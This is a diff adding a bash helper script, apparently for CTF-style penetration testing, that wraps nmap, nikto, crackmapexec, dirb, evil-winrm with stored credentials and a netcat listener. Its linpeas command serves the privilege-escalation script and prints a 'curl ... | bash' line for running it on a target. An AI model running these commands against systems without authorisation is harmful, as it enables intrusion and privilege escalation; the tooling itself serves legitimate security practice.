@@ -1,0 +1,313 @@
+#!/bin/bash
+# Remeber to use: https://www.shellcheck.net
+set -euo pipefail
+IFS=$'\n\t'
+
+# Uncomment for Debugging
+#set -x
+
+prompt() {
+  read -p "Run command? (y/N): " -n 1 -r
+  echo
+  if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
+    exit
+  fi
+}
+
+show_help() {
+  echo "Commands:"
+  grep "^##" "$0" | cut -d' ' -f2- | while IFS= read -r cmd; do
+    echo -e "  fxy $cmd"
+  done | sort
+}
+
+getIP() {
+  # This is pretty poor code. Sry, not sry :P
+  if [ -n "$(ip a | grep "tun0")" ]; then
+    DEV="tun0"
+  else
+    DEV="eth0"
+  fi
+
+  IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+  echo "$IP"
+}
+
+showCreds() {
+  FILE="creds.txt"
+    if [ ! -e "$FILE" ]; then
+    echo "[!] No '$FILE' found!"
+    exit
+  fi
+  echo "Available creds:"
+  column -t -s':' "$FILE" | cat -n
+}
+
+getCreds() {
+  FILE="creds.txt"
+  if [ ! -e "$FILE" ]; then
+    echo "[!] No '$FILE' found!"
+    exit
+  fi
+  USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
+  PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
+}
+
+## h(elp)\t\t\t\t\t: Show this help
+if [ ! "$#" -ge 1 ] || [ "$1" == "h" ] || [ "$1" == "help" ]|| [ "$1" == "-h" ] || [ "$1" == "-?" ]; then
+  show_help
+  exit
+fi
+
+## r(host)\t\t\t\t\t: Set RHOST
+if [ "$1" == "r" ] || [ "$1" == "rhost" ]; then
+  FPATH="/dev/shm/.fxy"
+  FILE="/dev/shm/.fxy/rhost"
+  if [ "$#" -eq 2 ]; then
+    mkdir "$FPATH"
+    echo "$2" > $FILE
+  else
+    echo "[!] You need to supply an IP or hostname as second argument!"
+  fi
+  exit
+fi
+
+# Load RHOST
+FILE="/dev/shm/.fxy/rhost"
+if [ -f $FILE ]; then
+  export RHOST="$(cat $FILE)"
+
+  if [ -z "$RHOST" ]; then
+     echo "Something went wrong on loading '$FILE'"
+     exit
+  fi
+else
+  echo "RHOST is not defined!"
+  exit
+fi
+
+## e(nv)\t\t\t\t\t: Show environment
+if [ "$1" == "e" ] || [ "$1" == "env" ]; then
+  echo "Environment:"
+  echo "  RHOST: $RHOST"
+  exit
+fi
+
+## httpd|www [port]\t\t\t\t: python3 -m http.server PORT
+if [ "$1" == "httpd" ] || [ "$1" == "www" ] ; then
+  CMD="python3 -m http.server"
+  PORT="80"
+  if [ "$#" -eq 2 ]; then
+    PORT="$2"
+  fi
+  CMD="$CMD $PORT"
+  echo "> $CMD"
+  bash -c "$CMD"
+  exit
+fi
+
+## l|isten [port]\t\t\t\t: nc -vlp PORT
+if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
+  CMD="nc -vlkp"
+  if [ "$#" -eq 2 ]; then
+    PORT="$2"
+  else
+    PORT="9001"
+  fi
+  CMD="$CMD $PORT"
+  echo "> $CMD"
+  bash -c "$CMD"
+  exit
+fi
+
+## n(map) [full]\t\t\t\t: nmap -v -A (-p-) RHOST | tee
+if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
+  CMD="nmap -v -A"
+  if [ "$#" -eq 2 ] && [ "$2" == "full" ]; then
+    CMD="$CMD -p-"
+  fi
+  CMD="$CMD $RHOST | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## nikto\t\t\t\t\t: nikto -host RHOST | tee
+if [ "$1" == "nikto" ]; then
+  CMD="nikto -host $RHOST | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## cme [smb]\t\t\t\t\t: crackmapexec smb RHOST | tee
+if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
+  CMD="crackmapexec"
+  if [ "$#" -eq 2 ] && [ "$2" == "smb" ]; then
+    CMD="$CMD smb"
+  else
+    exit
+  fi
+  CMD="$CMD $RHOST | tee ${RHOST}_cme_$(date +%F_%H%M%S).log"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## dirb [s|https|ssl|tls] [SUBDIR]\t\t: dirb PROTO://RHOST/SUBDIR | tee
+if [ "$1" == "dirb" ]; then
+  CMD="dirb"
+  if [ "$#" -eq 2 ]; then
+    if [ "$2" == "s" ] || [ "$2" == "https" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ] ; then
+      PROTO="https"
+    fi
+  else
+    PROTO="http"
+  fi
+
+  SUBDIR=""
+  if [ "$#" -eq 3 ]; then
+    SUBDIR="$3"
+  fi
+
+  CMD="$CMD $PROTO://$RHOST/$SUBDIR/ | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## curl [SUBDIR]\t\t\t\t: curl -si http://RHOST/SUBDIR | less
+if [ "$1" == "curl" ]; then
+  CMD="curl -si"
+
+  SUBDIR=""
+  if [ "$#" -eq 2 ]; then
+    SUBDIR="$2"
+  fi
+
+  CMD="$CMD http://${RHOST}${SUBDIR} | less"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## curls [SUBDIR]\t\t\t\t: curl -ski https://RHOST/SUBDIR | less
+if [ "$1" == "curls" ]; then
+  CMD="curl -ski"
+
+  SUBDIR=""
+  if [ "$#" -eq 2 ]; then
+    SUBDIR="$2"
+  fi
+
+  CMD="$CMD https://${RHOST}${SUBDIR} | less"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## p(ing) [:count]\t\t\t\t: ping -c COUNT RHOST
+if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
+  CMD="ping"
+
+  if [ "$#" -eq 2 ]; then
+    CMD="$CMD -c $2"
+  fi
+
+  CMD="$CMD $RHOST"
+  echo "> $CMD"
+  bash -c "$CMD"
+  exit
+fi
+
+## smbpasswd [:id]\t\t\t\t: smbpasswd -r RHOST -U :id
+if [ "$1" == "smbpasswd" ]; then
+  CMD="smbpasswd -r $RHOST -U"
+
+  # No ID supplied
+  if [ "$#" -eq 1 ]; then
+    showCreds
+    exit
+  fi
+
+  # CredID supplied
+  if [ "$#" -eq 2 ]; then
+    CID="$2"
+    getCreds
+  fi
+
+  CMD="$CMD $USRNME"
+  echo "Password: $PASSWD"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## (evil-)winrm [:id]\t\t\t: evil-winrm -i RHOST -u :id_user -p :id_pass
+if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
+  CMD="evil-winrm -i $RHOST"
+
+  # No ID supplied
+  if [ "$#" -eq 1 ]; then
+    showCreds
+    exit
+  fi
+
+  # CredID supplied
+  if [ "$#" -eq 2 ]; then
+    CID="$2"
+    getCreds
+  fi
+
+  CMD="$CMD -u '$USRNME' -p '$PASSWD'"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## linpeas [port]\t\t\t\t: Download linpeas and serve via http.server
+if [ "$1" == "linpeas" ]; then
+  echo "Download linpeas and serve via http.server?"
+  prompt
+
+  FPATH="/dev/shm/.fxy/linpeas"
+  mkdir -p "$FPATH"
+  cd "$FPATH"
+
+  wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O "$FPATH/linpeas.sh"
+
+  PORT="80"
+  if [ "$#" -eq 2 ]; then
+    PORT="$2"
+  fi
+
+  CMD="python3 -m http.server $PORT"
+  echo "$(tput bold)Run this on your target:"
+  echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_"'$(whoami).log'
+  echo "$(tput sgr0)"
+  echo "> $CMD"
+  bash -c "$CMD"
+  rm "$FPATH/linpeas.sh"
+  exit
+fi
+
+# showmount -e 10.10.10.180
+# fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+# winpeas
+# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+# cewl http://10.10.10.191 -w cewl.lst
+# wfuzz
+# hydra
+# msf multi handler
+# weevely
+
+# Nothing found? Invalid command?
+show_help; exit
